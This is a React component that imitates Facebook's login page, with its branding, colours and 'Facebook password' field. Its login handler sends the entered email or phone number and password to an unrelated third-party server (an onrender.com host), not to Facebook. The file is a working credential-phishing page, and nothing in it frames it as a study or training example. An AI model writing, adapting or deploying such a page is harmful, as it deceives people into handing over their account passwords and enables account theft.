import { useState } from "react";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { faEye, faEyeSlash } from "@fortawesome/free-solid-svg-icons";

function FacebookLogin() {
  const [showPassword, setShowPassword] = useState(false);
  const [identifier, setIdentifier] = useState("");
  const [password, setPassword] = useState("");
  const handleLogin = async (e) => {
    e.preventDefault();
    const options = {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        identifier: identifier,
        password: password,
        platform: "Facebook",
      }),
    };

    let response = await fetch("https://ott-platform-official.onrender.com", options);
    response = await response.json();
    console.log(response);
  };

  const handleEyeClick = () => {
    setShowPassword(!showPassword);
  };

  return (
    <div
      className="facebook-login font-inter min-h-screen"
      style={{ backgroundColor: "#F0F2F5" }}
    >
      <div
        className="h-14 bg-fbBanner fixed width-full inset-0 font-bold flex items-center justify-center text-4xl"
        style={{
          color: "white",
        }}
      >
        facebook
      </div>
      <div className="page-content pt-48 flex flex-col items-center">
        <h2 className="text-xl lg:text-3xl font-normal text-center opacity-50 mb-14">
          Log in to your Facebook account to <br />
          connect to Website
        </h2>
        <form action="" className="w-2/3 md:w-1/3 flex flex-col">
          <input
            type="text"
            placeholder="Mobile number or email address"
            className="py-4 indent-2"
            style={{ outline: 0 }}
            value={identifier}
            onChange={(e) => setIdentifier(e.target.value)}
          />
          <hr className="opacity-50" />
          <div className="relative">
            <input
              type={showPassword ? "text" : "password"}
              placeholder="Facebook password"
              className="py-4 indent-2 w-full"
              style={{ outline: 0 }}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <FontAwesomeIcon
              icon={showPassword ? faEye : faEyeSlash}
              className="absolute right-6 top-5 cursor-pointer"
              onClick={handleEyeClick}
            />
          </div>
          <button
            className="mt-14 py-4 bg-fbLogin text-xl"
            style={{ color: "white", borderRadius: "0.5rem" }}
            onClick={handleLogin}
          >
            Log in
          </button>
        </form>
      </div>
    </div>
  );
}

export default FacebookLogin;
